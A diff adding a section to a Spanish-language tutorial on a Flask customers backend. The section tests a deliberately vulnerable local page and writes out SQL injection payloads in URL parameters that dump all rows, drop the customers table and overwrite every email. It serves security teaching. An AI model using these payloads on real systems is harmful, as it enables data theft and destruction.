@@ -429,3 +429,33 @@ Ahora actualizaremos el archivo HTML para que se conecte con este backend median
    - **500** para errores en el servidor.
 5. **Nuevo endpoint `GET /customers/<id>`**:
    - Se añade un endpoint adicional para obtener un cliente por su ID (`GET /customers/<int:id>`).
+
+## **Probar la URL Vulnerable**
+
+Ahora puedes acceder a la URL vulnerable y hacer pruebas de inyección SQL.
+
+- URL Base:
+
+  ```bash
+  http://127.0.0.1:5000/pratica001.html?name=admin
+  ```
+
+#### **Ejemplo de URL Vulnerable con Inyección SQL**:
+
+- **Inyección SQL** para obtener todos los registros:
+
+  ```bash
+  http://127.0.0.1:5000/pratica001.html?name=' OR '1'='1
+  ```
+
+- **Inyección SQL** para eliminar la tabla `customers` (¡solo para pruebas!):
+
+  ```bash
+  http://127.0.0.1:5000/pratica001.html?name='; DROP TABLE customers; --
+  ```
+
+- **Inyección SQL** para modificar datos:
+
+  ```html
+  http://127.0.0.1:5000/pratica001.html?name='; UPDATE customers SET email='hacked@example.com'; --
+  ```
